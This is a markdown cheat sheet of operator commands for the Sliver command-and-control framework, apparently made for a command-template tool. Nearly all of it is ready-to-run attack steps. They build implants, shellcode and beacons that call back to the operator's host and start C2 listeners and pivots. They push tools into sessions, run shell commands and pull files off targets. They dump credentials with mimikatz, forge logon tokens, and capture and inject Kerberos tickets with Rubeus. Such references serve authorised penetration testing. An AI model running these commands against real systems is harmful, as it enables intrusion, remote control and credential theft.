# Sliver

<!-- cheat
export sliver
var tool = sh -c 'printf "%s\n" "$windows_tools/mimikatz.exe"; find "$windows_tools/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Windows tools'
var lport = printf '%s\n' '9001' '443' '5555' '4444' '1337' --- --header 'Ports'
var type = printf '%s\n' 'mtls' 'http' 'tcp-pivot' --- --header 'Implant type'
var os = printf '%s\n' 'windows' 'linux' 'temple-os' --- --header 'Operating system'
var name = printf '%s\n' 'win' 'lin' 'pivot' --- --header 'Implant name'
var template = printf '%s\n' '--skip-symbols' '' --- --header 'Sliver templates'
var mimicommands = printf '%s\n' 'sekurlsa::logonpasswords' 'sekurlsa::dpapi' 'sekurlsa::ekeys' 'sekurlsa::wdigest' 'lsadump::sam' 'lsadump::secrets' 'lsadump::cache' 'vault::list' 'vault::cred /patch' --- --header 'Mimikatz commands <- You should know what they do'
var logon_type = printf '%s\n' 'LOGON_INTERACTIVE' 'LOGON_NETWORK' 'LOGON_BATCH' 'LOGON_SERVICE' 'LOGON_UNLOCK' 'LOGON_NETWORK_CLEARTEXT' 'LOGON_NEW_CREDENTIALS'
-->

## Sliver implants

### Start server

Start the Sliver server.

```sh title:"Start Sliver server"
sliver server
```
<!-- cheat -->

### Start client

Start the Sliver client.

```sh title:"Start Sliver client"
sliver client
```
<!-- cheat -->

### Generate implant

Build a sliver implant for the chosen transport (mtls/http/tcp-pivot), OS, and naming. `--skip-symbols` shrinks the binary at the cost of debug info.

```sh title:"Sliver Build implant for chosen transport, OS, and name"
generate --$type $lhost:$lport --os $os -N $name $template
```
<!-- cheat
import tun_ip
import sliver
var type
var lport
var os
var name
var template
-->

### Generate shared library

Build a Windows DLL/shared-library implant over mTLS.

```sh title:"Sliver Generate Windows DLL over mTLS"
generate --format shared --mtls $lhost
```
<!-- cheat
var lhost
-->

### Generate shellcode

Build Windows shellcode over mTLS.

```sh title:"Sliver Generate Windows shellcode over mTLS"
generate --format shellcode --mtls $lhost
```
<!-- cheat
var lhost
-->

### Generate beacon

Build a Sliver beacon implant over mTLS.

```sh title:"Sliver Generate mTLS beacon implant"
generate beacon --mtls $lhost
```
<!-- cheat
var lhost
-->

### Generate DNS canary

Build an mTLS implant with a DNS canary.

```sh title:"Sliver Generate implant with DNS canary"
generate --mtls $lhost --canary $canary_domain
```
<!-- cheat
var lhost
var canary_domain
-->

### Generate execution-limited

Build an implant limited to a hostname, username, and domain-joined systems.

```sh title:"Sliver Generate implant with execution limits"
generate --mtls $lhost --limit-hostname $rhost_name --limit-username $user --limit-domainjoined
```
<!-- cheat
var lhost
var rhost_name
var user
-->

## Sliver pivots

### Start TCP pivot

Open a TCP pivot listener on the implant. Other implants can callback through this one to reach the C2.

```sh title:"Sliver Open TCP pivot on implant for nested callbacks"
pivot start $rhost_ip:$lport
```
<!-- cheat
import sliver
var rhost_ip
var lport
-->

## Sliver uploads

### Push tool

Upload a tool from your `$windows_tools` collection straight into the implant session.

```sh title:"Sliver Push tool from $windows_tools into implant session"
upload "$tool"
```
<!-- cheat
import tun_ip
import sliver
var tool
-->

## Sliver listeners

### Quick listener

Spin up a listener of the chosen type bound to host:port. One-liner alternative to the verbose `mtls`/`http` commands.

```sh title:"Sliver Spin up listener of chosen type at host:port"
$type -L $rhost_ip -l $lport
```
<!-- cheat
import sliver
var type
var rhost_ip
var lport
-->

### mTLS listener

Start an mTLS listener.

```sh title:"Sliver Start mTLS listener"
mtls --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### HTTP listener

Start an HTTP listener.

```sh title:"Sliver Start HTTP listener"
http --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### HTTPS listener

Start an HTTPS listener.

```sh title:"Sliver Start HTTPS listener"
https --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### DNS listener

Start a DNS listener.

```sh title:"Sliver Start DNS listener"
dns --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### Stage listener

Start a stage listener.

```sh title:"Sliver Start stage listener"
stage-listener --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

## Sliver session

### Jobs

List active Sliver listener jobs.

```sh title:"List Sliver jobs"
jobs
```
<!-- cheat -->

### Sessions

List active sessions.

```sh title:"List Sliver sessions"
sessions
```
<!-- cheat -->

### Beacons

List active beacons.

```sh title:"List Sliver beacons"
beacons
```
<!-- cheat -->

### Use session

Interact with a session.

```sh title:"Use Sliver session"
use $session_id
```
<!-- cheat
var session_id
-->

### Background

Background the active session.

```sh title:"Background active Sliver session"
background
```
<!-- cheat -->

### Execute

Execute a process in the active session.

```sh title:"Execute command in Sliver session"
execute $command
```
<!-- cheat
var command
-->

### Shell

Run a shell command in the active session.

```sh title:"Run shell command in Sliver session"
shell $command
```
<!-- cheat
var command
-->

### Download

Download a file from the target.

```sh title:"Download file from Sliver target"
download $remote_file
```
<!-- cheat
var remote_file
-->

## Sliver mimikatz

### Run mimikatz

Run a mimikatz command through the implant's built-in module. Pre-loaded with common credential dumping commands.

```sh title:"Sliver Run mimikatz command via implant built-in module"
mimikatz $mimicommands
```
<!-- cheat
import sliver
-->

## Sliver forge-token

### Make token

Forge a logon token for cleartext credentials. Use `.` as domain for local accounts. Pick the LOGON_* type matching the target service.

```sh title:"Sliver Forge logon token from cleartext (pick LOGON_* type)"
make-token -d $domain -u $user -p '$pass' --logon-type $logon_type
```
<!-- cheat
import tun_ip
import sliver
import domain_ip
import users
import passwords
var logon_type
-->

## Sliver rubeus-monitor

### Coerce monitor (filtered)

Run Rubeus monitor through the implant, filtering on the coerced machine account so you only catch the target's TGT.

```sh title:"Sliver Rubeus monitor filtered to coerced machine TGT"
rubeus -t 30 -- monitor /interval:$interval /runfor:$runfor /filteruser:$rhost_name$ /nowrap
```
<!-- cheat
import tun_ip
import sliver
import domain_ip
import users
var interval
var runfor
var rhost_name
-->

### Coerce monitor (unfiltered)

Same monitor but unfiltered. Catches every TGT that lands on the host (noisier output).

```sh title:"Sliver Rubeus monitor unfiltered (every inbound TGT)"
rubeus -t 30 -- monitor /interval:$interval /runfor:$runfor /nowrap
```
<!-- cheat
import tun_ip
import sliver
import domain_ip
import users
var interval
var runfor
-->

## Sliver Rubeus ptt-inject

### Inject TGT

Inject a base64 ticket into the current process via Rubeus running through the implant.

```sh title:"Sliver Inject base64 ticket into current process via Rubeus"
rubeus -i -- ptt /ticket:inject_ticket_here
```
<!-- cheat -->

### Dump tickets

Dump all tickets in the current LSA session.

```sh title:"Sliver Dump all tickets in current LSA session"
rubeus dump /nowrap 
```
<!-- cheat -->
